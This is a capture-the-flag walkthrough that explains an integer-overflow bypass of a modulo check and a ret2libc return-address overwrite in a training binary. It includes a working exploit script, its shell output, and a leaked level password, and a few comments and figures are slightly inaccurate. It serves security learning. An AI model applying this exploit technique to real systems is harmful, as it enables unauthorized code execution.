# Level 07 - Integer Overflow & Ret2Libc

## Overview

This level presents a "number storage service" program with the following features:
- **store**: Write a number to an array at a specified index
- **read**: Read a number from an array at a specified index
- **quit**: Exit the program

The program has security checks to prevent certain indices and values from being stored, but we can bypass them using integer overflow.

---

## Initial Analysis

### Program Behavior

```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 123456
 Index: 5
 Completed store command successfully

Input command: read
 Index: 5
 Number at data[5] is 123456
 Completed read command successfully
```

The program accepts unsigned integers (max: 4294967295 = 2^32 - 1).

---

## Vulnerability Discovery

### GDB Analysis - Finding the Stack Layout

```bash
(gdb) break *0x08048887    # Break in main after fgets
(gdb) run
(gdb) info frame

Stack level 0, frame at 0xffffd620:
 eip = 0x8048887 in main; saved eip 0xf7e45513
 Saved registers:
  ebp at 0xffffd618, eip at 0xffffd61c

(gdb) p/x $ebp+4           # Location of saved EIP
$1 = 0xffffd61c

(gdb) p/x $esp+0x24        # Location of data array
$2 = 0xffffd454
```

**Key Findings:**
- **Data array location**: `0xffffd454`
- **Saved EIP location**: `0xffffd61c`
- **Offset calculation**: `0xffffd61c - 0xffffd454 = 0x1c8 = 456 bytes = 114 dwords`

**Problem**: We need to write to index 114, but `114 % 3 = 0` which triggers the security check!

---

## Detailed Assembly Analysis

- focus on the vulnerability part

### Main Command Loop

```bash

0x08048729 <+6>:   and    $0xfffffff0,%esp        # Align stack to 16 bytes
0x0804872c <+9>:   sub    $0x1d0,%esp             # Allocate 464 bytes of stack space

...

0x08048882 <+351>: call   0x80484a0 <fgets@plt>   # Read command

# Calculate command string length
0x08048887 <+356>: lea    0x1b8(%esp),%eax        # eax = command buffer
0x0804888e <+363>: movl   $0xffffffff,0x14(%esp)  # counter = -1
0x08048896 <+371>: mov    %eax,%edx               # edx = command buffer
0x08048898 <+373>: mov    $0x0,%eax               # eax = 0 (search for null)
0x0804889d <+378>: mov    0x14(%esp),%ecx         # ecx = -1
0x080488a1 <+382>: mov    %edx,%edi               # edi = buffer
0x080488a3 <+384>: repnz scas %es:(%edi),%al      # Find length
0x080488a5 <+386>: mov    %ecx,%eax               # eax = -(len+2)
0x080488a7 <+388>: not    %eax                    # eax = len+1
0x080488a9 <+390>: sub    $0x1,%eax               # eax = len
0x080488ac <+393>: sub    $0x1,%eax               # eax = len-1
0x080488af <+396>: movb   $0x0,0x1b8(%esp,%eax,1) # Remove newline

# Compare command with "store"
0x080488b7 <+404>: lea    0x1b8(%esp),%eax        # eax = command buffer
0x080488be <+411>: mov    %eax,%edx               # edx = command
0x080488c0 <+413>: mov    $0x8048d5b,%eax         # eax = "store"
0x080488c5 <+418>: mov    $0x5,%ecx               # ecx = 5 (compare 5 chars)
0x080488ca <+423>: mov    %edx,%esi               # esi = command
0x080488cc <+425>: mov    %eax,%edi               # edi = "store"
0x080488ce <+427>: repz cmpsb %es:(%edi),%ds:(%esi) # Compare strings
0x080488d0 <+429>: seta   %dl                     # dl = (command > "store")
0x080488d3 <+432>: setb   %al                     # al = (command < "store")
0x080488d6 <+435>: mov    %edx,%ecx
0x080488d8 <+437>: sub    %al,%cl                 # cl = comparison result
0x080488da <+439>: mov    %ecx,%eax
0x080488dc <+441>: movsbl %al,%eax                # Sign extend to 32 bits
0x080488df <+444>: test   %eax,%eax               # Check if equal
0x080488e1 <+446>: jne    0x80488f8 <main+469>    # If not "store", check "read"
...

# Print command result
0x08048965 <+578>: cmpl   $0x0,0x1b4(%esp)        # Check ret_value
0x0804896d <+586>: je     0x8048989 <main+614>    # If 0, success

# Print failure message
0x0804896f <+588>: mov    $0x8048d6b,%eax         # "Failed to do %s command\n"
0x08048974 <+593>: lea    0x1b8(%esp),%edx        # edx = command name
0x0804897b <+600>: mov    %edx,0x4(%esp)          # arg2 = command
0x0804897f <+604>: mov    %eax,(%esp)             # arg1 = format string
0x08048982 <+607>: call   0x8048470 <printf@plt>
0x08048987 <+612>: jmp    0x80489a1 <main+638>    # Jump to clear buffer

...

# Clear command buffer for next iteration
0x080489a1 <+638>: lea    0x1b8(%esp),%eax        # eax = command buffer
0x080489a8 <+645>: movl   $0x0,(%eax)             # Clear bytes 0-3
0x080489ae <+651>: movl   $0x0,0x4(%eax)          # Clear bytes 4-7
0x080489b5 <+658>: movl   $0x0,0x8(%eax)          # Clear bytes 8-11
0x080489bc <+665>: movl   $0x0,0xc(%eax)          # Clear bytes 12-15
0x080489c3 <+672>: movl   $0x0,0x10(%eax)         # Clear bytes 16-19
0x080489ca <+679>: jmp    0x804884f <main+300>    # Loop back to read next command

# Quit - exit program
0x080489cf <+684>: nop                            # No operation
0x080489d0 <+685>: mov    $0x0,%eax               # Return 0
0x080489d5 <+690>: mov    0x1cc(%esp),%esi        # Load stack canary
0x080489dc <+697>: xor    %gs:0x14,%esi           # Compare with original canary
0x080489e3 <+704>: je     0x80489ea <main+711>    # If equal, canary intact
0x080489e5 <+706>: call   0x80484b0 <__stack_chk_fail@plt> # Canary modified!

# Function epilogue
0x080489ea <+711>: lea    -0xc(%ebp),%esp         # Restore stack pointer
0x080489ed <+714>: pop    %ebx                    # Restore callee-saved registers
0x080489ee <+715>: pop    %esi
0x080489ef <+716>: pop    %edi
0x080489f0 <+717>: pop    %ebp                    # Restore old base pointer
0x080489f1 <+718>: ret                            # Return to caller
```

### store_number Function

```bash
# Function prologue
0x08048630 <+0>:   push   %ebp                    # Save old base pointer
0x08048631 <+1>:   mov    %esp,%ebp               # Set new base pointer
0x08048633 <+3>:   sub    $0x28,%esp              # Allocate 40 bytes on stack

# Initialize local variables
0x08048636 <+6>:   movl   $0x0,-0x10(%ebp)        # number = 0
0x0804863d <+13>:  movl   $0x0,-0xc(%ebp)         # index = 0

# Print "Number: " prompt
0x08048644 <+20>:  mov    $0x8048ad3,%eax         # eax = " Number: "
0x08048649 <+25>:  mov    %eax,(%esp)             # arg1 = format string
0x0804864c <+28>:  call   0x8048470 <printf@plt>

# Read number from user
0x08048651 <+33>:  call   0x80485e7 <get_unum>    # Call get_unum()
0x08048656 <+38>:  mov    %eax,-0x10(%ebp)        # Store result in 'number'

# Print "Index: " prompt
0x08048659 <+41>:  mov    $0x8048add,%eax         # eax = " Index: "
0x0804865e <+46>:  mov    %eax,(%esp)             # arg1 = format string
0x08048661 <+49>:  call   0x8048470 <printf@plt>

# Read index from user
0x08048666 <+54>:  call   0x80485e7 <get_unum>    # Call get_unum()
0x0804866b <+59>:  mov    %eax,-0xc(%ebp)         # Store result in 'index'

# ============================================================
# SECURITY CHECK 1: Check if index % 3 == 0
# ============================================================
# This uses a "magic number" for fast modulo operation
# Instead of actual division, it multiplies by 0xaaaaaaab
# and uses bit shifts to compute index % 3

0x0804866e <+62>:  mov    -0xc(%ebp),%ecx         # ecx = index
0x08048671 <+65>:  mov    $0xaaaaaaab,%edx        # edx = magic number for div by 3
                                                   # 0xaaaaaaab = 2863311531
0x08048676 <+70>:  mov    %ecx,%eax               # eax = index
0x08048678 <+72>:  mul    %edx                    # edx:eax = index * 0xaaaaaaab
                                                   # Unsigned multiply: result in 64 bits
                                                   # Lower 32 bits in eax
                                                   # Upper 32 bits in edx
0x0804867a <+74>:  shr    %edx                    # edx = edx >> 1
                                                   # This effectively computes floor(index/3)
0x0804867c <+76>:  mov    %edx,%eax               # eax = floor(index/3)
0x0804867e <+78>:  add    %eax,%eax               # eax = floor(index/3) * 2
0x08048680 <+80>:  add    %edx,%eax               # eax = floor(index/3) * 3
0x08048682 <+82>:  mov    %ecx,%edx               # edx = index
0x08048684 <+84>:  sub    %eax,%edx               # edx = index - (floor(index/3)*3)
                                                   # This is: edx = index % 3
0x08048686 <+86>:  test   %edx,%edx               # Check if index % 3 == 0
0x08048688 <+88>:  je     0x8048697 <store_number+103> # If 0, ERROR!

# ============================================================
# SECURITY CHECK 2: Check if top byte of number is 0xb7
# ============================================================
# This prevents storing stack addresses (which start with 0xbf...)

0x0804868a <+90>:  mov    -0x10(%ebp),%eax        # eax = number
0x0804868d <+93>:  shr    $0x18,%eax              # eax = number >> 24 (get top byte)
0x08048690 <+96>:  cmp    $0xb7,%eax              # Compare with 0xb7
0x08048695 <+101>: jne    0x80486c2 <store_number+146> # If not 0xb7, OK!

# ============================================================
# ERROR HANDLING: Print error and return 1
# ============================================================
0x08048697 <+103>: movl   $0x8048ae6,(%esp)       # arg1 = " *** ERROR! ***"
0x0804869e <+110>: call   0x80484c0 <puts@plt>
0x080486a3 <+115>: movl   $0x8048af8,(%esp)       # arg1 = "   This index is..."
0x080486aa <+122>: call   0x80484c0 <puts@plt>
0x080486af <+127>: movl   $0x8048ae6,(%esp)       # arg1 = " *** ERROR! ***"
0x080486b6 <+134>: call   0x80484c0 <puts@plt>
0x080486bb <+139>: mov    $0x1,%eax               # Return 1 (error)
0x080486c0 <+144>: jmp    0x80486d5 <store_number+165> # Exit function

# ============================================================
# VULNERABILITY: Write number to data[index]
# ============================================================
# This is the vulnerable write operation!
# No bounds checking - we can write ANYWHERE!

0x080486c2 <+146>: mov    -0xc(%ebp),%eax         # eax = index
0x080486c5 <+149>: shl    $0x2,%eax               # eax = index * 4 (shift left by 2)
                                                   # Converts index to byte offset
0x080486c8 <+152>: add    0x8(%ebp),%eax          # eax = data_array + (index * 4)
                                                   # Calculate target address
0x080486cb <+155>: mov    -0x10(%ebp),%edx        # edx = number
0x080486ce <+158>: mov    %edx,(%eax)             # *eax = number
                                                   # WRITE THE NUMBER!
0x080486d0 <+160>: mov    $0x0,%eax               # Return 0 (success)

# Function epilogue
0x080486d5 <+165>: leave                          # Restore ebp, esp
0x080486d6 <+166>: ret                            # Return to caller
```

## Exploitation Strategy

### The Problem

We need to overwrite the saved EIP at **index 114**, but `114 % 3 = 0` triggers the security check!

### The Solution: Integer Overflow

The key insight is that when the program calculates the address:
```bash
address = data_array + (index * 4)
```

The multiplication `index * 4` is done with a **left shift by 2** (`shl $0x2`). If we use a very large number, the multiplication will overflow!

### Finding the Magic Number

We need a number that:
1. **Passes the modulo check**: `number % 3 != 0`
2. **Overflows to point to index 114**: `(number << 2) & 0xFFFFFFFF == 456` (456 bytes = 114 * 4)

**The magic number is: 2147483762**

Let's verify:
```
2147483762 in binary:
10000000 00000000 00000000 01110010

When shifted left by 2 (multiply by 4):
  Original:     10000000 00000000 00000000 01110010
  After << 2:  1000000000 00000000 00000000 0111001000
  
In 32-bit (overflow happens, top 2 bits are lost):
               00000000 00000000 00000001 11001000 = 456 bytes!

Check modulo 3:
2147483762 % 3 = 2 (NOT 0, passes the check!)
```

### Stack Layout After Exploit

```
Memory Layout:
┌─────────────────────────────────┐
│  Data Array (100 dwords)        │  esp+0x24 = 0xffffd454
│  [0] [1] [2] ... [99]           │
├─────────────────────────────────┤
│  ... other stack data ...       │
├─────────────────────────────────┤
│  [index 114] = system()         │  0xffffd61c (saved EIP)
├─────────────────────────────────┤
│  [index 115] = unused           │  0xffffd620 (return addr for system)
├─────────────────────────────────┤
│  [index 116] = "/bin/sh"        │  0xffffd624 (argument to system)
└─────────────────────────────────┘
```

When `main()` returns:
1. `ret` instruction pops saved EIP (index 114) → jumps to `system()`
2. `system()` looks for its first argument at `[esp+4]` → finds "/bin/sh" at index 116
3. `system("/bin/sh")` executes → shell spawned!

---

## The Magic Number Explained

### Why Division by 3 Uses Multiplication

Modern CPUs are **very fast at multiplication** but **very slow at division**. Compilers use a clever trick called "magic number" division:

Instead of:
```bash
result = index / 3;
remainder = index % 3;
```

The compiler does:
```bash
magic = 0xaaaaaaab;  // Precomputed constant
result = (index * magic) >> 33;  // Division
remainder = index - (result * 3); // Modulo
```

### The Math Behind 0xaaaaaaab

The magic number `0xaaaaaaab` is calculated as:
```
magic = ceil(2^33 / 3) = ceil(8589934592 / 3) = 2863311531 = 0xaaaaaaab
```

When you multiply by this number and shift right by 33 bits, you effectively divide by 3!

**Why it works:**
```
index / 3 ≈ (index * (2^33 / 3)) / 2^33
          = (index * 2^33 / 3) / 2^33
          = index / 3
```

The beauty is that this works for all 32-bit unsigned integers!

### Visual Explanation

```
Example: index = 114

Step 1: Multiply by magic number
114 * 0xaaaaaaab = 326417514666 (64-bit result)
                 = 0x4C00000052 (hex)
                 
edx:eax = 0x0000004C : 0x00000052
          └─ upper ──┘   └─ lower ─┘

Step 2: Shift right by 1
edx >> 1 = 0x4C >> 1 = 0x26 = 38

Step 3: Calculate floor(index/3)
38 is floor(114/3) = floor(38) = 38

Step 4: Calculate index % 3
remainder = 114 - (38 * 3) = 114 - 114 = 0

Therefore: 114 % 3 = 0 ✗ BLOCKED!
```

---

## Final Exploit

### Finding System and /bin/sh Addresses

```bash
(gdb) break main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```

**Addresses:**
- `system()`: `0xf7e6aed0` = `4159090384` (decimal)
- `"/bin/sh"`: `0xf7f897ec` = `4160264172` (decimal)

### The Exploit Script

```bash
(python -c "
print 'store'
print '4159090384'    # system() address
print '2147483762'    # Magic index (overflows to 114)
print 'store'
print '4160264172'    # /bin/sh address
print '116'           # Normal index (116 % 3 = 2, passes!)
print 'quit'
"; cat) | ./level07
```

### Running the Exploit

```bash
level07@OverRide:~$ (python -c "
print 'store'
print '4159090384'
print '2147483762'
print 'store'
print '4160264172'
print '116'
print 'quit'
"; cat) | ./level07

----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command: 
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
---

## Detailed Calculations

### Index 114 Calculation
```
Data array:     0xffffd454
Saved EIP:      0xffffd61c
Difference:     0xffffd61c - 0xffffd454 = 0x1c8 = 456 bytes
Dword offset:   456 / 4 = 114 dwords
```

### Magic Number Derivation
```
Target offset:  114 dwords = 456 bytes
Binary goal:    00000000 00000000 00000001 11001000 (456)

Work backwards from shift left by 2:
Before shift:   10000000 00000000 00000000 01110010 (2147483762)

Verification:
2147483762 << 2 (in 32-bit) = 456 ✓
2147483762 % 3 = 2 (not 0) ✓
```

### Alternative Indices
```
Index   Offset  Mod 3  Status   Points To
─────────────────────────────────────────────
113     452     2      ✓ OK     Saved EBP
114     456     0      ✗ NO     Saved EIP (target!)
115     460     1      ✓ OK     Frame base
116     464     2      ✓ OK     After frame
117     468     0      ✗ NO     After frame
118     472     1      ✓ OK     After frame
```